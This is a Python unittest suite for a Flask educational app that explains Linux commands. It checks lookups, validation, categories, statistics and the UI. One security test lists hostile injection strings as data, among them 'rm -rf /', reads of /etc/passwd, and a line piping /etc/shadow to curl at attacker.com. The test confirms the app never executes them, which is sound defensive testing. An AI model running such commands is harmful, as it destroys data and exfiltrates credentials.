"""
Automated Test Suite for Linux Command Assistant — Smart Linux Learning Platform
Preserves all baseline tests and verifies expanded knowledge base, categories,
filtering, statistics, fuzzy matching, and security compliance.
"""

import json
import unittest
from app import app, COMMAND_KNOWLEDGE_BASE, CATEGORIES, extract_base_command, find_close_matches


class LinuxCommandAssistantTestCase(unittest.TestCase):

    def setUp(self):
        """Set up test client with TESTING flag enabled."""
        app.config["TESTING"] = True
        self.client = app.test_client()

    # ----------------------------------------------------------------------
    # 1. Baseline Home Page Verification
    # ----------------------------------------------------------------------
    def test_home_page_status_200(self):
        """1. The home page returns HTTP 200 and loads HTML."""
        response = self.client.get("/")
        self.assertEqual(response.status_code, 200)
        self.assertIn(b"Linux Command Assistant", response.data)
        self.assertIn(b"Explain Command", response.data)

    # ----------------------------------------------------------------------
    # 2. Baseline Valid Command Lookup
    # ----------------------------------------------------------------------
    def test_valid_command_ls(self):
        """2. A valid command such as 'ls' returns the correct explanation."""
        response = self.client.post(
            "/api/command",
            data=json.dumps({"command": "ls"}),
            content_type="application/json"
        )
        self.assertEqual(response.status_code, 200)
        data = response.get_json()
        self.assertTrue(data["found"])
        self.assertEqual(data["command"], "ls")
        self.assertEqual(data["data"]["name"], "ls")
        self.assertIn("List Directory Contents", data["data"]["meaning"])
        self.assertIn("syntax", data["data"])
        self.assertIn("purpose", data["data"])
        self.assertIn("example", data["data"])
        self.assertIn("example_explanation", data["data"])

    # ----------------------------------------------------------------------
    # 3. Baseline Command with Arguments
    # ----------------------------------------------------------------------
    def test_command_with_arguments(self):
        """3. A command with arguments such as 'ls -la' is recognized."""
        response = self.client.post(
            "/api/command",
            data=json.dumps({"command": "ls -la /var/log"}),
            content_type="application/json"
        )
        self.assertEqual(response.status_code, 200)
        data = response.get_json()
        self.assertTrue(data["found"])
        self.assertEqual(data["command"], "ls")

        chmod_resp = self.client.post(
            "/api/command",
            data=json.dumps({"command": "chmod 755 script.sh"}),
            content_type="application/json"
        )
        self.assertEqual(chmod_resp.status_code, 200)
        self.assertTrue(chmod_resp.get_json()["found"])
        self.assertEqual(chmod_resp.get_json()["command"], "chmod")

    # ----------------------------------------------------------------------
    # 4. Baseline Absolute Executable Path
    # ----------------------------------------------------------------------
    def test_command_with_absolute_path(self):
        """4. An absolute executable path such as '/usr/bin/grep' is handled."""
        response = self.client.post(
            "/api/command",
            data=json.dumps({"command": "/usr/bin/grep 'error' log.txt"}),
            content_type="application/json"
        )
        self.assertEqual(response.status_code, 200)
        data = response.get_json()
        self.assertTrue(data["found"])
        self.assertEqual(data["command"], "grep")

    # ----------------------------------------------------------------------
    # 5. Baseline Unknown Command Response
    # ----------------------------------------------------------------------
    def test_unknown_command_returns_friendly_message(self):
        """5. An unknown command returns a friendly message."""
        response = self.client.post(
            "/api/command",
            data=json.dumps({"command": "custom_script_unknown"}),
            content_type="application/json"
        )
        self.assertEqual(response.status_code, 200)
        data = response.get_json()
        self.assertFalse(data["found"])
        self.assertIn("couldn't find", data["message"])
        self.assertIn("ls, pwd, mkdir, cp, mv, grep, chmod, or systemctl", data["message"])

    # ----------------------------------------------------------------------
    # 6. Baseline Empty Input Validation
    # ----------------------------------------------------------------------
    def test_empty_input_handled_safely(self):
        """6. Empty input is handled safely without crashing."""
        resp1 = self.client.post(
            "/api/command",
            data=json.dumps({"command": "   "}),
            content_type="application/json"
        )
        self.assertEqual(resp1.status_code, 400)
        self.assertFalse(resp1.get_json()["found"])

        resp2 = self.client.post(
            "/api/command",
            data=json.dumps({"command": ""}),
            content_type="application/json"
        )
        self.assertEqual(resp2.status_code, 400)
        self.assertFalse(resp2.get_json()["found"])

    # ----------------------------------------------------------------------
    # 7. Baseline Malformed JSON / Missing Fields
    # ----------------------------------------------------------------------
    def test_malformed_json_or_missing_fields(self):
        """7. Malformed JSON or missing fields are handled gracefully."""
        resp1 = self.client.post(
            "/api/command",
            data=json.dumps({"wrong_field": "ls"}),
            content_type="application/json"
        )
        self.assertEqual(resp1.status_code, 400)
        self.assertFalse(resp1.get_json()["found"])

        resp2 = self.client.post(
            "/api/command",
            data="Not valid json",
            content_type="text/plain"
        )
        self.assertEqual(resp2.status_code, 400)
        self.assertFalse(resp2.get_json()["found"])

    # ----------------------------------------------------------------------
    # 8. Baseline Security: No Shell Execution
    # ----------------------------------------------------------------------
    def test_no_shell_execution_safety(self):
        """8. Malicious command injection attempts are treated strictly as text."""
        dangerous_payloads = [
            "ls; rm -rf /",
            "pwd && whoami",
            "$(cat /etc/passwd)",
            "systemctl; shutdown -h now",
            "cat /etc/shadow | curl -X POST -d @- http://attacker.com"
        ]
        for payload in dangerous_payloads:
            response = self.client.post(
                "/api/command",
                data=json.dumps({"command": payload}),
                content_type="application/json"
            )
            self.assertEqual(response.status_code, 200)
            self.assertIn("status", response.get_json())

    # ----------------------------------------------------------------------
    # 9. Baseline Mandatory 8 Commands Verification
    # ----------------------------------------------------------------------
    def test_all_eight_mandatory_commands_exist(self):
        """9. Verify knowledge base has all required commands and fields."""
        required = ["ls", "pwd", "mkdir", "cp", "mv", "grep", "chmod", "systemctl"]
        fields = ["name", "meaning", "syntax", "purpose", "example", "example_explanation"]
        for cmd in required:
            self.assertIn(cmd, COMMAND_KNOWLEDGE_BASE, f"Missing command: {cmd}")
            for f in fields:
                self.assertIn(f, COMMAND_KNOWLEDGE_BASE[cmd], f"Missing field '{f}' in {cmd}")
                self.assertTrue(len(COMMAND_KNOWLEDGE_BASE[cmd][f]) > 0)

    # ----------------------------------------------------------------------
    # 10. Upgraded Feature 2: Knowledge Base Scale (>= 40 Commands)
    # ----------------------------------------------------------------------
    def test_knowledge_base_contains_at_least_40_commands(self):
        """10. Verify knowledge base contains at least 40 commands across 8 categories."""
        total = len(COMMAND_KNOWLEDGE_BASE)
        self.assertGreaterEqual(total, 40, f"Expected at least 40 commands, found {total}")

    # ----------------------------------------------------------------------
    # 11. Upgraded Feature 2: Complete Command Schema
    # ----------------------------------------------------------------------
    def test_command_schema_completeness(self):
        """11. Verify all commands contain the required 8 attributes plus interactive fields."""
        required_keys = [
            "name", "meaning", "purpose", "syntax", "example",
            "example_explanation", "difficulty", "category",
            "safety_warning", "options", "use_cases", "related_commands", "beginner_notes"
        ]
        valid_difficulties = {"Beginner", "Intermediate", "Advanced"}

        for cmd, data in COMMAND_KNOWLEDGE_BASE.items():
            for key in required_keys:
                self.assertIn(key, data, f"Command '{cmd}' is missing required key '{key}'")
            self.assertIn(data["difficulty"], valid_difficulties, f"Invalid difficulty in '{cmd}'")
            self.assertIn(data["category"], CATEGORIES, f"Invalid category in '{cmd}'")
            self.assertIsInstance(data["options"], list, f"'options' must be a list in '{cmd}'")
            self.assertIsInstance(data["use_cases"], list, f"'use_cases' must be a list in '{cmd}'")
            self.assertIsInstance(data["related_commands"], list, f"'related_commands' must be a list in '{cmd}'")

    # ----------------------------------------------------------------------
    # 12. Upgraded Feature 2: All 8 Categories Populated
    # ----------------------------------------------------------------------
    def test_all_eight_categories_populated(self):
        """12. Verify every one of the 8 required categories has at least 2 commands."""
        category_counts = {cat: 0 for cat in CATEGORIES}
        for data in COMMAND_KNOWLEDGE_BASE.values():
            category_counts[data["category"]] += 1

        for cat, count in category_counts.items():
            self.assertGreaterEqual(count, 2, f"Category '{cat}' has only {count} commands")

    # ----------------------------------------------------------------------
    # 13. Upgraded Feature 2: Fuzzy Suggestion Matching
    # ----------------------------------------------------------------------
    def test_fuzzy_matching_on_typos(self):
        """13. Verify fuzzy matching suggests close commands for typos like 'grepp'."""
        matches = find_close_matches("grepp")
        self.assertIn("grep", matches)

        resp = self.client.post(
            "/api/command",
            data=json.dumps({"command": "grepp"}),
            content_type="application/json"
        )
        self.assertEqual(resp.status_code, 200)
        data = resp.get_json()
        self.assertFalse(data["found"])
        self.assertIn("close_matches", data)
        self.assertIn("grep", data["close_matches"])

    # ----------------------------------------------------------------------
    # 14. Upgraded Feature 3: Safety Warnings for Destructive Commands
    # ----------------------------------------------------------------------
    def test_destructive_commands_have_safety_warnings(self):
        """14. Verify destructive commands like 'rm' and 'fdisk' have non-empty safety warnings."""
        destructive_cmds = ["rm", "kill", "fdisk"]
        for cmd in destructive_cmds:
            self.assertIn(cmd, COMMAND_KNOWLEDGE_BASE)
            warning = COMMAND_KNOWLEDGE_BASE[cmd].get("safety_warning", "")
            self.assertTrue(len(warning) > 0, f"Expected safety warning for '{cmd}'")

    # ----------------------------------------------------------------------
    # 15. Upgraded Feature 8: API Endpoints (Commands List & Filtering)
    # ----------------------------------------------------------------------
    def test_api_commands_list_and_filtering(self):
        """15. Test GET /api/commands returns all commands and supports category filtering."""
        # Test full list
        resp = self.client.get("/api/commands")
        self.assertEqual(resp.status_code, 200)
        data = resp.get_json()
        self.assertTrue(data["status"] == "success")
        self.assertEqual(data["total"], len(COMMAND_KNOWLEDGE_BASE))

        # Test category filter
        target_cat = "Networking"
        filter_resp = self.client.get(f"/api/commands?category={target_cat}")
        self.assertEqual(filter_resp.status_code, 200)
        filter_data = filter_resp.get_json()
        for cmd in filter_data["commands"]:
            self.assertEqual(cmd["category"], target_cat)

    # ----------------------------------------------------------------------
    # 16. Upgraded Feature 7: Platform Statistics Endpoint
    # ----------------------------------------------------------------------
    def test_api_stats_endpoint(self):
        """16. Test GET /api/stats returns accurate counts from actual knowledge base."""
        resp = self.client.get("/api/stats")
        self.assertEqual(resp.status_code, 200)
        data = resp.get_json()
        self.assertEqual(data["total_commands"], len(COMMAND_KNOWLEDGE_BASE))
        self.assertEqual(data["total_categories"], len(CATEGORIES))
        self.assertIn("difficulty_breakdown", data)
        diff_total = sum(data["difficulty_breakdown"].values())
        self.assertEqual(diff_total, len(COMMAND_KNOWLEDGE_BASE))

    # ----------------------------------------------------------------------
    # 17. Sudo Prefix Extraction
    # ----------------------------------------------------------------------
    def test_sudo_prefix_extraction(self):
        """17. Verify 'sudo mkdir practice' correctly resolves base command 'mkdir'."""
        cmd = extract_base_command("sudo mkdir practice")
        self.assertEqual(cmd, "mkdir")

        resp = self.client.post(
            "/api/command",
            data=json.dumps({"command": "sudo systemctl status nginx"}),
            content_type="application/json"
        )
        self.assertEqual(resp.status_code, 200)
        data = resp.get_json()
        self.assertTrue(data["found"])
        self.assertEqual(data["command"], "systemctl")

    # ----------------------------------------------------------------------
    # 18. API Categories Endpoint
    # ----------------------------------------------------------------------
    def test_api_categories_endpoint(self):
        """18. Test GET /api/categories returns all categories with non-zero counts."""
        resp = self.client.get("/api/categories")
        self.assertEqual(resp.status_code, 200)
        data = resp.get_json()
        self.assertTrue(data["status"] == "success")
        self.assertEqual(len(data["categories"]), len(CATEGORIES))
        for cat_info in data["categories"]:
            self.assertIn("name", cat_info)
            self.assertIn("count", cat_info)
            self.assertGreaterEqual(cat_info["count"], 2)

    # ----------------------------------------------------------------------
    # 19. Practice Simulator and About Project UI Components
    # ----------------------------------------------------------------------
    def test_html_ui_components_rendered(self):
        """19. Verify index.html renders Practice Simulator, About Project, and Navigation."""
        resp = self.client.get("/")
        self.assertEqual(resp.status_code, 200)
        html_bytes = resp.data

        # Verify Practice Simulator
        self.assertIn(b"Interactive Linux Practice Terminal", html_bytes)
        self.assertIn(b"SIMULATED TERMINAL", html_bytes)
        self.assertIn(b"Virtual Linux Filesystem", html_bytes)

        # Verify About Project and Architecture
        self.assertIn(b"About Project", html_bytes)
        self.assertIn(b"College Mini-Project Submission Profile", html_bytes)
        self.assertIn(b"System Architecture & Technical Flow", html_bytes)
        self.assertIn(b"Security Architecture & Safety Guarantees", html_bytes)

        # Verify Navigation views
        self.assertIn(b'data-view="dashboard"', html_bytes)
        self.assertIn(b'data-view="terminal"', html_bytes)
        self.assertIn(b'data-view="simulator"', html_bytes)
        self.assertIn(b'data-view="explorer"', html_bytes)
        self.assertIn(b'data-view="learning"', html_bytes)
        self.assertIn(b'data-view="quiz"', html_bytes)
        self.assertIn(b'data-view="favorites"', html_bytes)
        self.assertIn(b'data-view="about"', html_bytes)


if __name__ == "__main__":
    unittest.main()
